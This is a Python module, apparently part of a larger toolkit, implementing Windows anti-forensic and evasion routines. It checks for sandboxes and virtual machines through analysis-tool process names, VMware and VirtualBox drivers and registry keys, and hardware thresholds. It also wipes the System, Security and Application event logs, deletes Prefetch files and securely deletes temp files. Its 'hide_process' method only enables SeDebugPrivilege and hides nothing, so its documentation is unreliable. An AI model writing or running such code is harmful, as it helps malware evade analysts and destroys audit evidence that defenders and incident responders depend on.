import os
import sys
import platform
import psutil
import ctypes
import win32api
import win32con
import win32security
from typing import List, Dict, Optional
from ..core.logger import get_logger
from ..core.security import security

logger = get_logger(__name__)

class AntiForensicManager:
    """Advanced anti-forensic and evasion techniques."""
    
    def __init__(self):
        self.sandbox_indicators = {
            "processes": [
                "wireshark", "procmon", "proc_analyzer", "sysinspector",
                "process_hacker", "autoit", "pestudio", "vmwaretray",
                "vmwareuser", "vboxservice", "vmtoolsd"
            ],
            "files": [
                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmci.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmci.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys"
            ],
            "registry_keys": [
                "SOFTWARE\\VMware, Inc.\\VMware Tools",
                "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"
            ]
        }
    
    def detect_sandbox(self) -> bool:
        """
        Detect if running in a sandbox environment.
        
        Returns:
            bool: True if sandbox detected, False otherwise
        """
        checks = [
            self._check_processes(),
            self._check_files(),
            self._check_registry(),
            self._check_memory(),
            self._check_cpu(),
            self._check_disk(),
            self._check_network()
        ]
        
        return any(checks)
    
    def _check_processes(self) -> bool:
        """Check for sandbox-related processes."""
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in self.sandbox_indicators["processes"]:
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return False
    
    def _check_files(self) -> bool:
        """Check for sandbox-related files."""
        return any(os.path.exists(path) for path in self.sandbox_indicators["files"])
    
    def _check_registry(self) -> bool:
        """Check for sandbox-related registry keys."""
        try:
            for key in self.sandbox_indicators["registry_keys"]:
                if win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, key):
                    return True
        except WindowsError:
            pass
        return False
    
    def _check_memory(self) -> bool:
        """Check for suspicious memory patterns."""
        try:
            total_memory = psutil.virtual_memory().total
            if total_memory < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                return True
        except:
            pass
        return False
    
    def _check_cpu(self) -> bool:
        """Check for suspicious CPU patterns."""
        try:
            cpu_count = psutil.cpu_count()
            if cpu_count < 2:  # Less than 2 cores
                return True
        except:
            pass
        return False
    
    def _check_disk(self) -> bool:
        """Check for suspicious disk patterns."""
        try:
            for partition in psutil.disk_partitions():
                if partition.fstype == 'vboxsf':  # VirtualBox shared folder
                    return True
        except:
            pass
        return False
    
    def _check_network(self) -> bool:
        """Check for suspicious network patterns."""
        try:
            interfaces = psutil.net_if_stats()
            if len(interfaces) < 2:  # Less than 2 network interfaces
                return True
        except:
            pass
        return False
    
    def hide_process(self, pid: int) -> bool:
        """
        Hide process from task manager and other tools.
        
        Args:
            pid: Process ID to hide
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Modify process token
            process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
            
            # Add SeDebugPrivilege
            privilege_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
            win32security.AdjustTokenPrivileges(token_handle, False, [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)])
            
            # Close handles
            win32api.CloseHandle(token_handle)
            win32api.CloseHandle(process_handle)
            
            return True
        except Exception as e:
            logger.error(f"Error hiding process: {e}")
            return False
    
    def clear_traces(self) -> bool:
        """
        Clear forensic traces.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Clear event logs
            os.system("wevtutil cl System")
            os.system("wevtutil cl Security")
            os.system("wevtutil cl Application")
            
            # Clear prefetch
            prefetch_dir = "C:\\Windows\\Prefetch"
            for file in os.listdir(prefetch_dir):
                try:
                    os.remove(os.path.join(prefetch_dir, file))
                except:
                    pass
            
            # Clear temp files
            temp_dir = os.environ.get("TEMP")
            for file in os.listdir(temp_dir):
                try:
                    file_path = os.path.join(temp_dir, file)
                    if os.path.isfile(file_path):
                        security.secure_delete(file_path)
                except:
                    pass
            
            return True
        except Exception as e:
            logger.error(f"Error clearing traces: {e}")
            return False
    
    def evade_detection(self) -> Dict[str, bool]:
        """
        Apply multiple evasion techniques.
        
        Returns:
            Dict[str, bool]: Status of each evasion technique
        """
        results = {
            "sandbox_detected": self.detect_sandbox(),
            "process_hidden": self.hide_process(os.getpid()),
            "traces_cleared": self.clear_traces()
        }
        
        if results["sandbox_detected"]:
            logger.warning("Sandbox environment detected!")
        
        return results

# Create global anti-forensic instance
anti_forensic = AntiForensicManager() 